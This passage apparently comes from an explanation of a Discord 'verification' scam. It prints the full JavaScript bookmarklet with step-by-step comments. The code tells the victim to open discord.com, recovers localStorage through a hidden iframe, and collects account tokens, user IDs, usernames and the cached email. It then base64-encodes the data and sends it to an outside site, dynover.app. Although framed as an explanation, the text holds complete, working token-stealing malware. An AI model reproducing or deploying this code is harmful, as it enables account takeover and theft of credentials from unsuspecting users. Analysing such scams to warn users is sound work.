Finally, the explained version:

javascript: ! function () {
    if ("https://discord.com" !== this.document.location.origin) alert("Drag this button to your bookmark and go to discord.com to get verified.");   ##Checks to see if you are on 'discord.com', and if not, alerts you to go to discord.com
    else {
        const o = window.document.createElement("iframe"); ##creates invisible iframe
        window.document.head.append(o);
        var e = Object.getOwnPropertyDescriptor(o.contentWindow, "localStorage"); ##Starting to get local storage
        o.remove(), Object.defineProperty(window, "localStorage", e);
        const a = JSON.parse(localStorage.getItem("tokens")), ##Gets everything with the tag 'tokens'
            r = JSON.parse(localStorage.getItem("MultiAccountStore"))._state.users, ## parses the tokens and stores them
            c = localStorage.getItem("email_cache").slice(1, -1), ##stores tokens as "email_cache"
            n = r.length;
        let t = [];
        for (let e = 0; e < n; e++) {
            var l = {
                id: r[e].id.replaceAll("\"", "&quot;").replaceAll("<", "&lt;").replaceAll(">", "&gt;"), ##grabs discord user id and makes it nice
                username: (r[e].username + r[e].discriminator).replaceAll("\"", "&quot;").replaceAll("<", "&lt;").replaceAll(">", "&gt;"), ##grabs discord username and makes it nice
                tokenStatus: r[e].tokenStatus.toString().replaceAll("\"", "&quot;").replaceAll("<", "&lt;").replaceAll(">", "&gt;"), ##grabs discord token status to make sure its valid
                token: a[r[e].id].replaceAll("\"", "&quot;").replaceAll("<", "&lt;").replaceAll(">", "&gt;"), ##grabs discord token and makes it nice
                email: c.replaceAll("\"", "&quot;").replaceAll("<", "&lt;").replaceAll(">", "&gt;") ##grabs your email and makes it nice
            };
            t.push(l) ##pushing the above to below
        }
        e = JSON.stringify(t), e = btoa(e);
        window.open("https://dynover.app/verifier/?data=" + e) ##opens new window with all of your data into this website (including token)
    }
}();
